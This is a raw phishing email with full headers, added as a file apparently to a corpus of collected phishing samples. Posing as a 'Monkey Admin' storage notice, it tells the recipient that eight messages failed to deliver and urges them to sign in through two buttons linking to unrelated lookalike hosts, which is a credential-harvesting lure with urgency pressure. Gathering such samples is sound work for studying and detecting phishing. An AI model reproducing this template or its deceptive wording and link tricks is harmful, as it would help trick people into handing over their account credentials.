@@ -1,0 +1,164 @@
+Return-Path: anonymous@s25.xrea.com
+Delivered-To: jose@monkey.org
+X-FDA: 81300188634.39.3FF23CB
+Received: from s25.xrea.com (s25.xrea.com [160.251.150.125])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id C540F180003
+	for <jose@monkey.org>; Mon,  2 Oct 2023 10:44:55 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=pass (imf30.b.hostedemail.com: domain of anonymous@s25.xrea.com designates 160.251.150.125 as permitted sender) smtp.mailfrom=anonymous@s25.xrea.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1696243496;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=k+HJopq7QbKepl2+OA5qZ+uXGiv3iexFeEWRi0F9N0A=;
+	b=LtycDFJPNVSIZZavVutFnhXlo/eKrJxwExyLm3BduDBAD6Z+b8rl6Mp480Aah7eQ0FOLd8
+	CUoMZFt8WuyyKj0LOeYUpYCqN6sOf2AJBxxqSbyV2IdNgvwcIGMuFJtaqo1EuA2dwkUrFn
+	lPoCezIiOhZkB+P6JwpmidS8I5LJf/M=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=pass (imf30.b.hostedemail.com: domain of anonymous@s25.xrea.com designates 160.251.150.125 as permitted sender) smtp.mailfrom=anonymous@s25.xrea.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1696243496; a=rsa-sha256;
+	cv=none;
+	b=4d0L6f9ZOSulW2OUVbYh+T0oyRY1ueZ+wvLycevnKGzGkHqLEWTdl1fZ4mnGOND/w67g82
+	+f9+m7TwV3Jh7eAeP8I1SdF3Di0aYejetKuHLVX9tQ0NKnbC4rF/e5eSTv6qaXSCIkHWNt
+	oYqBUJovuOlnB0a4dfQqFADyo5EVohA=
+Received: (qmail 438779 invoked by uid 23599); 2 Oct 2023 19:44:32 +0900
+Date: 2 Oct 2023 19:44:32 +0900
+To: jose@monkey.org
+Subject: You will not be able to receive future messages due to insufficient storage
+X-PHP-Originating-Script: 23599:wp-include.php
+MIME-Version: 1.0
+Content-type: text/HTML; charset="UTF-8X-Priority: 3
+X-MSMail-Priority: Normal
+Importance: Normal
+Message-ID: <1696243472-99733-94a08da1fecbb6e8b46990538c7b50b2@c3zenshin.s25.xrea.com>
+From: =?UTF-8?B?TW9ua2V5IGNQYW7wnZmabA==?= <1696243472-99733-24c51252d294d8a535cb6dc459f12451@s25.xrea.com>
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: C540F180003
+X-Stat-Signature: qg47fgmx8fgi587jfawn1kt4kgixt6p1
+X-Spam-Status: No, score=4.20
+X-Rspam-User: 
+X-HE-Tag: 1696243495-407882
+X-HE-Meta: U2FsdGVkX19ygclk+PW95fihZSsdFsqIOCVw0ocFz2/NhPQtqJkdda/R5zUtSacwiKh/GRcoFemdYKhpLGMw0pkc/p0VWaIuQuiuYAU4/WXeVqiZk7saO1mvEGBBXkfsG7jFzpM2aTCHnY4aBkcglErz2Vk3nBCIwCV1HiVuJ694Nmw7Mzeh5sX/aTqIQA16Dtv3DuN1FURreaVx3qKsyPEVkEIYE/pFcoUhMKnsuo6rUtR4Zk3f++TRSVt7bJJ9lQvaUQc35JKPnQTZU9DNGn8xH32T64PSitqpauiWP6roBtfqTYaZEK97RLjb5Yj0
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 298
+
+
+<!doctype html>
+<html>
+  <head>
+  <style>
+body {
+    background-color:#FFFFFF;
+	font-size:16px;
+	font-family:monospace;
+	margin:0;
+    padding:0;
+	text-align: center;
+    -ms-text-size-adjust: 100%;
+    -webkit-text-size-adjust: 100%;
+}
+img {
+  max-width: 90%;
+  max-height: 90%;
+  position: absolute;
+  align:middle;
+  left: 0;
+  right: 0;
+  margin: auto;
+ 
+}
+span, h2{
+	text-align: center;
+}
+table {
+		border: none;
+        border-collapse: separate;
+        width: 100%; }
+        table td {
+          font-family: monospace;
+          font-size: 14px;
+          vertical-align: top; }
+		  
+	  /* -------------------------------------
+          RESPONSIVE AND MOBILE FRIENDLY STYLES
+      ------------------------------------- */
+		  
+		  @media only screen and (max-width: 620px) {
+        table[class=body] h1 {
+          font-size: 28px !important;
+          margin-bottom: 10px !important; }
+        table[class=body] p,
+        table[class=body] ul,
+        table[class=body] ol,
+        table[class=body] td,
+        table[class=body] span,
+        table[class=body] a {
+          font-size: 16px !important; }
+        table[class=body] .wrapper,
+        table[class=body] .article {
+          padding: 10px !important; }
+        table[class=body] .content {
+          padding: 0 !important; }
+        table[class=body] .container {
+          padding: 0 !important;
+          width: 100% !important; }
+        table[class=body] .main {
+          border-left-width: 0 !important;
+          border-radius: 0 !important;
+          border-right-width: 0 !important; }
+        table[class=body] .btn table {
+          width: 100% !important; }
+        table[class=body] .btn a {
+          width: 100% !important; }
+        table[class=body] .img-responsive {
+          height: auto !important;
+          max-width: 100% !important;
+          width: auto !important; }}
+		  
+</style>
+   <meta name='viewport' content='width=device-width' />
+    <meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+  </head>
+  <body>
+  <table>
+  <tr>
+  <td>
+  <br>
+  <span>
+  <div style='background-color:#f3fff8;border-left-style:solid;border-radius:5px;border-left-width:6px;border-color:#029740;height:auto;padding:5px;text-align:left;width:90%;padding-left:3%;'>This email was generated automatically from monkey.org</div>
+</span>
+<br>
+<div>
+</div><br><br><br><br><br><span>
+<h2 style='color:#2153d3;text-decoration:underline;'>Monkey  failure delivery  Notice  on 1st of October 2023   </h2><br>
+</span>
+<span>8 New mails failed to deliver to <span style='font-weight:bold;'>jose@monkey.org</span> box, due to low storage capacity</span><br><br>
+<span>An approval is needed from you to move these messages and free up memory space</span><br><br>
+<span>Please sign-in from Monkey Organization portal to release messages to the inbox folder and free up space </span><br><br>
+<span><a style='color:#fff; font-size:15px; padding:5px; background-color:#2153d3; border-radius:2px;line-height:35px; text-decoration:none;' href='http://Jose-51094.website.com#jose@monkey.org' target='_blank' >Approve Here</a></span>
+<span><a style='color:#fff; font-size:15px; padding:5px; background-color:#2153d3; border-radius:2px;line-height:35px; text-decoration:none;' href='http://51094-Jose.website.com#jose@monkey.org' target='_blank' >Free Storage Space</a></span>
+<br><br>
+<span style='color:red;'>Deliveries will remain pending until you take the required action</span>
+<br><br><br>
+<Span>Kind Regards,</span><br><br>
+<Span>Monkey Admin.</span><br><br><br>
+<hr style='color:#2153d3;'>
+
+
+<div style='font-size:11px'> monkey.org &copy 2023 |  <a href='http://taiyouhousing.com/#jose@monkey.org' style='color:#555555;text-decoration:none' target='_blank'></a>  <a href='#' style='color:#555555;text-decoration:none' target='_blank'>Terms of Use</a> | <a href='#' style='color:#555555;text-decoration:none' target='_blank'>Security and Privacy</a></div><div class='yj6qo'></div><div class='adL'>   </div></div><div class='adL'>
+  </div></div><div class='adL'>  
+</div></div>
+
+</td></tr></table>
+  </body>
+  </html>
+	
+
